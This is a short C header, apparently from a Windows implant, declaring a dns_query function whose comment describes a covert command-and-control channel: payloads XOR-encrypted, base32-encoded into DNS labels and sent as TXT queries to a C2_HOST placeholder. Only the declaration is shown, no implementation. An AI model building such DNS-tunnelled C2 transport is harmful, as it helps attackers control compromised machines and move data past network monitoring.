#ifndef DNS_H
#define DNS_H

#include <stdint.h>

/*
 * Build an upstream envelope, XOR-encrypt, base32-encode, embed into
 * DNS labels, send a raw UDP TXT query to C2_HOST:C2_PORT, receive
 * the answer, base32-decode + XOR-decrypt the TXT value.
 *
 * Returns a heap-allocated buffer: [resp_type(1)][data_len LE(2)][data(N)]
 * Caller must HeapFree() the returned pointer.
 * Returns NULL on any error.
 * *out_len is set to the total byte count of the returned buffer.
 */
uint8_t *dns_query(const uint8_t *payload, size_t payload_len,
                   uint8_t msg_type, uint8_t seq,
                   size_t *out_len);

#endif
